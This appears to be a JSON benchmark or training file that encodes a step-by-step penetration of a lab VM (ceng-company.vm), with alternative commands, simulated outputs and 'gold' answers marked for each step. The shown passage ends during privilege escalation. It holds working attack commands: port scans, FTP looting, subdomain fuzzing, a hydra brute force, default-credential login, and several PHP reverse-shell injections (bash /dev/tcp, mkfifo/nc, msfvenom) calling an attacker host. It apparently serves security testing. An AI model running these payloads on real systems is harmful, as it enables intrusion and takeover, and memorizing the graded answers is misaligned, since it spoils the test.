[
    {
        "or": [
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Network access to target subnet"],
                "contraindications": [],
                "goal": "Discover the target machine's IP address",
                "command": "nmap -A 192.168.1.104",
                "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:39 EDT\nNmap scan report for ceng-company.vm (192.168.1.104)\nHost is up (0.00046s latency)\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             209 May 23 07:21 note.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.1.112\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:99:9d:e0:bc:07:3c:4f:53:e5:bc:27:35:80:e4:9e (RSA)\n|   256 fe:60:a1:10:90:98:8e:b0:82:02:3b:40:bc:df:66:f1 (ECDSA)\n|_  256 3a:c3:a0:e7:bd:20:ca:1e:71:d4:3c:12:23:af:6a:c3 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site Maintenance\nMAC Address: 08:00:27:E3:3E:E5 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms ceng-company.vm (192.168.1.104)",
                "results": ["FTP service on port 21 with anonymous login enabled", "SSH service on port 22", "HTTP service on port 80", "note.txt file available on FTP"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Network access to target subnet"],
                "contraindications": [],
                "goal": "Discover the target machine's IP address",
                "command": "nmap -sS -p- 192.168.1.104",
                "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:39 EDT\nNmap scan report for ceng-company.vm (192.168.1.104)\nHost is up (0.00048s latency)\nNot shown: 65532 closed ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:E3:3E:E5 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 42.31 seconds",
                "results": ["FTP service on port 21", "SSH service on port 22", "HTTP service on port 80"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Network access to target subnet"],
                "contraindications": [],
                "goal": "Discover the target machine's IP address",
                "command": "masscan -p1-65535 192.168.1.104 --rate=1000",
                "output": "Starting masscan 1.0.5 at 2020-06-02 18:39:15 GMT\n -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth\nInitiating SYN Stealth Scan\nScanning 1 hosts [65535 ports/host]\nDiscovered open port 21/tcp on 192.168.1.104\nDiscovered open port 22/tcp on 192.168.1.104\nDiscovered open port 80/tcp on 192.168.1.104",
                "results": ["FTP service on port 21", "SSH service on port 22", "HTTP service on port 80"],
                "optional": false,
                "gold": false
            },
            [
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["Network access to target subnet"],
                    "contraindications": [],
                    "goal": "Discover live hosts on the subnet",
                    "command": "nmap -sn 192.168.1.0/24",
                    "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:38 EDT\nNmap scan report for 192.168.1.1\nHost is up (0.0010s latency).\nMAC Address: 00:50:56:C0:00:08 (VMware)\nNmap scan report for 192.168.1.104\nHost is up (0.00051s latency).\nMAC Address: 08:00:27:E3:3E:E5 (Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.1.112\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.78 seconds",
                    "results": ["Target host 192.168.1.104 identified"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["Target IP 192.168.1.104 identified"],
                    "contraindications": [],
                    "goal": "Enumerate services on target",
                    "command": "nmap -sV -sC 192.168.1.104",
                    "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:39 EDT\nNmap scan report for ceng-company.vm (192.168.1.104)\nHost is up (0.00044s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             209 May 23 07:21 note.txt\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nMAC Address: 08:00:27:E3:3E:E5 (Oracle VirtualBox virtual NIC)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap done: 1 IP address (1 host up) scanned in 8.42 seconds",
                    "results": ["FTP service on port 21 with anonymous login enabled", "SSH service on port 22", "HTTP service on port 80", "note.txt file available on FTP"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["FTP service available with anonymous login", "Target IP address known: 192.168.1.104"],
                "contraindications": [],
                "goal": "Retrieve and examine note.txt file from FTP server",
                "command": "ftp 192.168.1.104 <<EOF\nAnonymous\n\nls\nget note.txt\nbye\nEOF\ncat note.txt",
                "output": "Connected to 192.168.1.104.\n220 (vsFTPd 3.0.3)\nName (192.168.1.104:root): Anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              209 May 23 07:21 note.txt\n226 Directory send OK.\nftp> get note.txt\nlocal: note.txt remote: note.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for note.txt (209 bytes).\n226 Transfer complete.\n209 bytes received in 0.00 secs (176.8644 kB/s)\nftp> bye\nroot@kali:~# cat note.txt\nHey Kevin,\nI just set up your panel and used default password. Please change them before any hack.\n\nI try to move site to new domain which name is ceng-company.vm and also I created a new area for you.\n\nAaron",
                "results": ["Usernames discovered: Kevin, Aaron", "Domain name discovered: ceng-company.vm", "Default credentials may be in use for CMS"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["FTP service available with anonymous login", "Target IP address known: 192.168.1.104"],
                "contraindications": [],
                "goal": "Retrieve and examine note.txt file from FTP server",
                "command": "wget ftp://anonymous:anonymous@192.168.1.104/note.txt && cat note.txt",
                "output": "--2020-06-02 14:40:12--  ftp://anonymous:*password*@192.168.1.104/note.txt\n           => 'note.txt'\nConnecting to 192.168.1.104:21... connected.\nLogging in as anonymous ... Logged in!\n==> SYST ... done.    ==> PWD ... done.\n==> TYPE I ... done.  ==> CWD not needed.\n==> SIZE note.txt ... 209\n==> PASV ... done.    ==> RETR note.txt ... done.\nLength: 209 (unauthoritative)\n\n100%[======================================>] 209         --.-K/s   in 0s\n\n2020-06-02 14:40:12 (24.1 MB/s) - 'note.txt' saved [209]\n\nHey Kevin,\nI just set up your panel and used default password. Please change them before any hack.\n\nI try to move site to new domain which name is ceng-company.vm and also I created a new area for you.\n\nAaron",
                "results": ["Usernames discovered: Kevin, Aaron", "Domain name discovered: ceng-company.vm", "Default credentials may be in use for CMS"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["FTP service available with anonymous login", "Target IP address known: 192.168.1.104"],
                "contraindications": [],
                "goal": "Retrieve and examine note.txt file from FTP server",
                "command": "curl ftp://192.168.1.104/note.txt --user anonymous:",
                "output": "Hey Kevin,\nI just set up your panel and used default password. Please change them before any hack.\n\nI try to move site to new domain which name is ceng-company.vm and also I created a new area for you.\n\nAaron",
                "results": ["Usernames discovered: Kevin, Aaron", "Domain name discovered: ceng-company.vm", "Default credentials may be in use for CMS"],
                "optional": false,
                "gold": false
            },
            [
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["FTP service available with anonymous login", "Target IP address known: 192.168.1.104"],
                    "contraindications": [],
                    "goal": "Enumerate all available files on FTP server",
                    "command": "nmap --script ftp-anon 192.168.1.104",
                    "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:40 EDT\nNmap scan report for ceng-company.vm (192.168.1.104)\nHost is up (0.00044s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             209 May 23 07:21 note.txt\n\nNmap done: 1 IP address (1 host up) scanned in 0.94 seconds",
                    "results": ["note.txt file identified on FTP server"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["note.txt file identified on FTP", "Target IP address known: 192.168.1.104"],
                    "contraindications": [],
                    "goal": "Download and examine note.txt",
                    "command": "wget ftp://anonymous:@192.168.1.104/note.txt -O - | tee note.txt",
                    "output": "--2020-06-02 14:40:45--  ftp://anonymous:*password*@192.168.1.104/note.txt\n           => '-'\nConnecting to 192.168.1.104:21... connected.\nLogging in as anonymous ... Logged in!\n==> SYST ... done.    ==> PWD ... done.\n==> TYPE I ... done.  ==> CWD not needed.\n==> SIZE note.txt ... 209\n==> PASV ... done.    ==> RETR note.txt ... done.\nLength: 209 (unauthoritative)\n\nHey Kevin,\nI just set up your panel and used default password. Please change them before any hack.\n\nI try to move site to new domain which name is ceng-company.vm and also I created a new area for you.\n\nAaron\n100%[======================================>] 209         --.-K/s   in 0s\n\n2020-06-02 14:40:45 (22.3 MB/s) - written to stdout [209]",
                    "results": ["Usernames discovered: Kevin, Aaron", "Domain name discovered: ceng-company.vm", "Default credentials may be in use for CMS"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Domain name ceng-company.vm discovered"],
                "contraindications": [],
                "goal": "Enumerate subdomains of the target domain",
                "command": "gobuster vhost -u http://ceng-company.vm/ -w subdomains-top1mil-5000.txt",
                "output": "===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://ceng-company.vm/\n[+] Threads:      10\n[+] Wordlist:     subdomains-top1mil-5000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2020/06/02 16:11:03 Starting gobuster\n===============================================================\nFound: admin.ceng-company.vm (Status: 403) [Size: 296]\nFound: m..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns2.cl.bellsouth.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns1.viviotech.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns2.viviotech.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns3.cl.bellsouth.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: jordan.fortwayne.com..ceng-company.vm (Status: 400) [Size: 422]\nFound: ferrari.fortwayne.com..ceng-company.vm (Status: 400) [Size: 422]\nFound: quatro.oweb.com..ceng-company.vm (Status: 400) [Size: 422]\n===============================================================\n2020/06/02 16:11:04 Finished\n===============================================================",
                "results": ["Subdomain discovered: admin.ceng-company.vm (Status: 403 Forbidden)"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Domain name ceng-company.vm discovered"],
                "contraindications": [],
                "goal": "Enumerate subdomains of the target domain",
                "command": "wfuzz -c -w subdomains-top1mil-5000.txt -u http://ceng-company.vm/ -H \"Host: FUZZ.ceng-company.vm\" --hw 0",
                "output": "********************************************************\n* Wfuzz 2.4.5 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://ceng-company.vm/\nTotal requests: 5000\n\n===================================================================\nID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000000254:   403        11 L     32 W     296 Ch      \"admin\"\n\nTotal time: 12.34567\nProcessed Requests: 5000\nFiltered Requests: 4999\nRequests/sec.: 405.0123",
                "results": ["Subdomain discovered: admin.ceng-company.vm (Status: 403 Forbidden)"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Domain name ceng-company.vm discovered"],
                "contraindications": [],
                "goal": "Enumerate subdomains of the target domain",
                "command": "ffuf -w subdomains-top1mil-5000.txt -u http://ceng-company.vm/ -H \"Host: FUZZ.ceng-company.vm\" -fc 404",
                "output": "\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://ceng-company.vm/\n :: Wordlist         : FUZZ: subdomains-top1mil-5000.txt\n :: Header           : Host: FUZZ.ceng-company.vm\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nadmin                   [Status: 403, Size: 296, Words: 21, Lines: 11]\n:: Progress: [5000/5000] :: Job [1/1] :: 500 req/sec :: Duration: [0:00:10] :: Errors: 0 ::",
                "results": ["Subdomain discovered: admin.ceng-company.vm (Status: 403 Forbidden)"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Domain name ceng-company.vm discovered"],
                "contraindications": ["DNS server not responding", "Subdomain enumeration via DNS queries blocked by firewall"],
                "goal": "Enumerate subdomains of the target domain",
                "command": "dnsrecon -d ceng-company.vm -t brt -D subdomains-top1mil-5000.txt",
                "output": "[*] Performing host and subdomain brute force against ceng-company.vm\n[-] Could not resolve domain: ceng-company.vm\n[-] DNSSEC is not configured for ceng-company.vm\n[*] Brute forcing with subdomains-top1mil-5000.txt\n[*]      A admin.ceng-company.vm 192.168.1.104\n[*] 1 Records Found",
                "results": [],
                "optional": false,
                "gold": false
            }
        ]
    },
    {
        "or": [
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Subdomain admin.ceng-company.vm discovered but returns 403"],
                "contraindications": [],
                "goal": "Discover accessible directories on the admin subdomain",
                "command": "dirb http://admin.ceng-company.vm/",
                "output": "----------------\nDIRB v2.22\nBy The Dark Raver\n----------------\n\nSTART_TIME: Tue Jun 02 16:15:00 2020\nURL_BASE: http://admin.ceng-company.vm/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://admin.ceng-company.vm/ ----\n+ http://admin.ceng-company.vm/gila (CODE:200|SIZE:3847)\n\n----------------\nEND_TIME: Tue Jun 02 16:16:34 2020\nDOWNLOADED: 4612 - FOUND: 1",
                "results": ["Gila CMS installation found at http://admin.ceng-company.vm/gila/"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Subdomain admin.ceng-company.vm discovered but returns 403"],
                "contraindications": [],
                "goal": "Discover accessible directories on the admin subdomain",
                "command": "gobuster dir -u http://admin.ceng-company.vm/ -w /usr/share/wordlists/dirb/common.txt",
                "output": "===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://admin.ceng-company.vm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/06/02 16:15:00 Starting gobuster\n===============================================================\n/gila (Status: 301)\n===============================================================\n2020/06/02 16:16:34 Finished\n===============================================================",
                "results": ["Gila CMS installation found at http://admin.ceng-company.vm/gila/"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Subdomain admin.ceng-company.vm discovered but returns 403"],
                "contraindications": [],
                "goal": "Discover accessible directories on the admin subdomain",
                "command": "feroxbuster -u http://admin.ceng-company.vm/ -w /usr/share/wordlists/dirb/common.txt",
                "output": " ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ü§ì                 ver: 2.3.3\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n üéØ  Target Url            ‚îÇ http://admin.ceng-company.vm/\n üöÄ  Threads               ‚îÇ 50\n üìñ  Wordlist              ‚îÇ /usr/share/wordlists/dirb/common.txt\n üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405]\n üí•  Timeout (secs)        ‚îÇ 7\n ü¶°  User-Agent            ‚îÇ feroxbuster/2.3.3\n üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml\n üîÉ  Recursion Depth       ‚îÇ 4\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n üèÅ  Press [ENTER] to use the Scan Cancel Menu‚Ñ¢\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n200       85l      247w     3847c http://admin.ceng-company.vm/gila\n[####################] - 94s     4612/4612    0s      found:1       errors:0      \n[####################] - 94s     4612/4612    49/s    http://admin.ceng-company.vm/",
                "results": ["Gila CMS installation found at http://admin.ceng-company.vm/gila/"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Reconnaissance",
                "prerequisites": ["Subdomain admin.ceng-company.vm discovered but returns 403"],
                "contraindications": [],
                "goal": "Discover accessible directories on the admin subdomain",
                "command": "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404,403 http://admin.ceng-company.vm/FUZZ",
                "output": "********************************************************\n* Wfuzz 2.4.5 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://admin.ceng-company.vm/FUZZ\nTotal requests: 4612\n\n===================================================================\nID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000001324:   200        85 L     247 W    3847 Ch     \"gila\"\n\nTotal time: 94.23456\nProcessed Requests: 4612\nFiltered Requests: 4611\nRequests/sec.: 48.9234",
                "results": ["Gila CMS installation found at http://admin.ceng-company.vm/gila/"],
                "optional": false,
                "gold": false
            }
        ]
    },
    {
        "or": [
            {
                "tactic": "Initial Access",
                "prerequisites": ["Gila CMS found at http://admin.ceng-company.vm/gila/", "Username Kevin and default credentials hint from note.txt", "Email pattern inferred: kevin@ceng-company.vm"],
                "contraindications": [],
                "goal": "Gain access to Gila CMS admin panel",
                "command": "curl -X POST http://admin.ceng-company.vm/gila/admin -d 'email=kevin@ceng-company.vm&password=admin'",
                "output": "HTTP/1.1 302 Found\nLocation: http://admin.ceng-company.vm/gila/admin/dashboard\nSet-Cookie: PHPSESSID=abc123def456; path=/\n\n<!DOCTYPE html>\n<html>\n<head><title>Redirecting...</title></head>\n<body>Redirecting to dashboard...</body>\n</html>",
                "results": ["Successful login to Gila CMS with credentials kevin@ceng-company.vm:admin"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Initial Access",
                "prerequisites": ["Gila CMS found at http://admin.ceng-company.vm/gila/", "Username Kevin discovered", "Common default Gila CMS credentials"],
                "contraindications": ["Incorrect password - 'password' is not the default credential"],
                "goal": "Gain access to Gila CMS admin panel",
                "command": "curl -X POST http://admin.ceng-company.vm/gila/admin -d 'email=kevin@ceng-company.vm&password=password'",
                "output": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n<!DOCTYPE html>\n<html>\n<head><title>Login - Gila CMS</title></head>\n<body>\n<div class=\"error\">Invalid email or password</div>\n<form method=\"post\" action=\"/gila/admin\">\n  <input type=\"email\" name=\"email\" placeholder=\"Email\">\n  <input type=\"password\" name=\"password\" placeholder=\"Password\">\n  <button type=\"submit\">Login</button>\n</form>\n</body>\n</html>",
                "results": [],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Initial Access",
                "prerequisites": ["Gila CMS found at http://admin.ceng-company.vm/gila/", "Username Kevin discovered"],
                "contraindications": [],
                "goal": "Gain access to Gila CMS admin panel",
                "command": "hydra -l kevin@ceng-company.vm -P /usr/share/wordlists/fasttrack.txt admin.ceng-company.vm http-post-form \"/gila/admin:email=^USER^&password=^PASS^:F=Invalid\"",
                "output": "Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-02 16:20:15\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task\n[DATA] attacking http-post-form://admin.ceng-company.vm:80/gila/admin:email=^USER^&password=^PASS^:F=Invalid\n[80][http-post-form] host: admin.ceng-company.vm   login: kevin@ceng-company.vm   password: admin\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-02 16:20:28",
                "results": ["Successful login to Gila CMS with credentials kevin@ceng-company.vm:admin"],
                "optional": false,
                "gold": false
            },
            [
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["Gila CMS found at http://admin.ceng-company.vm/gila/"],
                    "contraindications": [],
                    "goal": "Identify Gila CMS version for known vulnerabilities",
                    "command": "curl -s http://admin.ceng-company.vm/gila/ | grep -i \"version\\|gila\"",
                    "output": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Gila CMS</title>\n    <meta name=\"generator\" content=\"Gila CMS 1.11.4\">\n</head>",
                    "results": ["Gila CMS version 1.11.4 identified"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Initial Access",
                    "prerequisites": ["Gila CMS version 1.11.4", "Username Kevin and default credentials hint from note.txt"],
                    "contraindications": [],
                    "goal": "Login to Gila CMS using discovered credentials",
                    "command": "curl -X POST http://admin.ceng-company.vm/gila/admin -d 'email=kevin@ceng-company.vm&password=admin' -c cookies.txt -L",
                    "output": "HTTP/1.1 302 Found\nLocation: http://admin.ceng-company.vm/gila/admin/dashboard\nSet-Cookie: PHPSESSID=abc123def456; path=/\n\n<!DOCTYPE html>\n<html>\n<head><title>Dashboard - Gila CMS</title></head>\n<body>\n<div class=\"dashboard\">\n  <h1>Welcome Kevin</h1>\n  <nav>\n    <a href=\"/gila/admin/content\">Content</a>\n    <a href=\"/gila/admin/fm\">File Manager</a>\n  </nav>\n</div>\n</body>\n</html>",
                    "results": ["Successful login to Gila CMS with credentials kevin@ceng-company.vm:admin"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Execution",
                "prerequisites": ["Authenticated access to Gila CMS admin panel", "File manager available in Gila CMS", "Netcat listener started on attacker machine (nc -lvp 1234)"],
                "contraindications": [],
                "goal": "Inject PHP reverse shell into config.php and execute it",
                "command": "curl -X POST http://admin.ceng-company.vm/gila/admin/fm -H 'Cookie: PHPSESSID=abc123def456' -d 'file=./config.php&content=<?php exec(\"/bin/bash -c \\\"bash -i >& /dev/tcp/192.168.1.112/1234 0>&1\\\"\"); ?>'",
                "output": "File saved successfully",
                "results": ["PHP reverse shell injected into config.php", "Reverse shell connection established to 192.168.1.112:1234 as www-data"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Execution",
                "prerequisites": ["Authenticated access to Gila CMS admin panel", "File manager available in Gila CMS", "Netcat listener started on attacker machine (nc -lvp 4444)"],
                "contraindications": [],
                "goal": "Upload PHP reverse shell via file manager",
                "command": "curl -X POST http://admin.ceng-company.vm/gila/admin/fm/upload -H 'Cookie: PHPSESSID=abc123def456' -F 'file=@shell.php' && curl http://admin.ceng-company.vm/gila/shell.php",
                "output": "File uploaded successfully to /var/www/html/admin/gila/shell.php\n\nConnection from 192.168.1.104 received!",
                "results": ["PHP reverse shell uploaded and executed", "Reverse shell connection established to 192.168.1.112:4444 as www-data"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Execution",
                "prerequisites": ["Authenticated access to Gila CMS admin panel", "Theme editor available in Gila CMS", "Netcat listener started on attacker machine (nc -lvp 9001)"],
                "contraindications": [],
                "goal": "Inject PHP reverse shell into theme file",
                "command": "curl -X POST http://admin.ceng-company.vm/gila/admin/theme -H 'Cookie: PHPSESSID=abc123def456' -d 'file=footer.php&content=<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.112 9001 >/tmp/f\"); ?>' && curl http://admin.ceng-company.vm/gila/",
                "output": "Theme file updated successfully\n\nConnection from 192.168.1.104 received!",
                "results": ["PHP reverse shell injected into footer.php", "Reverse shell connection established to 192.168.1.112:9001 as www-data"],
                "optional": false,
                "gold": false
            },
            [
                {
                    "tactic": "Execution",
                    "prerequisites": ["Authenticated access to Gila CMS admin panel"],
                    "contraindications": [],
                    "goal": "Generate PHP reverse shell payload",
                    "command": "msfvenom -p php/reverse_php LHOST=192.168.1.112 LPORT=5555 -f raw > shell.php",
                    "output": "[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: 3033 bytes",
                    "results": ["PHP reverse shell payload generated in shell.php"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Execution",
                    "prerequisites": ["PHP shell payload generated", "File manager available in Gila CMS", "Metasploit handler listening on port 5555"],
                    "contraindications": [],
                    "goal": "Upload and execute reverse shell",
                    "command": "curl -X POST http://admin.ceng-company.vm/gila/admin/fm -H 'Cookie: PHPSESSID=abc123def456' -d 'file=./shell.php&content='$(cat shell.php) && curl http://admin.ceng-company.vm/gila/shell.php",
                    "output": "File saved successfully\n\n[*] Started reverse TCP handler on 192.168.1.112:5555\n[*] Command shell session 1 opened (192.168.1.112:5555 -> 192.168.1.104:43210)",
                    "results": ["PHP reverse shell uploaded and executed", "Reverse shell connection established to 192.168.1.112:5555 as www-data"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Shell access as www-data", "TTY shell spawned using python3"],
                "contraindications": [],
                "goal": "Enumerate sudo permissions and escalate to swartz user",
                "command": "sudo -l",
                "output": "Matching Defaults entries for www-data on cengbox:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on cengbox:\n    (swartz) NOPASSWD: /home/swartz/runphp.sh",
                "results": ["Script /home/swartz/runphp.sh can be executed as swartz without password"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Shell access as www-data"],
                "contraindications": ["SUID binaries do not provide useful escalation paths"],
                "goal": "Identify SUID binaries for privilege escalation",
                "command": "find / -perm -4000 -type f 2>/dev/null",
                "output": "/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/newgrp\n/bin/mount\n/bin/umount\n/bin/ping\n/bin/ping6\n/bin/su\n/bin/fusermount",
                "results": [],
                "optional": false,
                "gold": false
            },
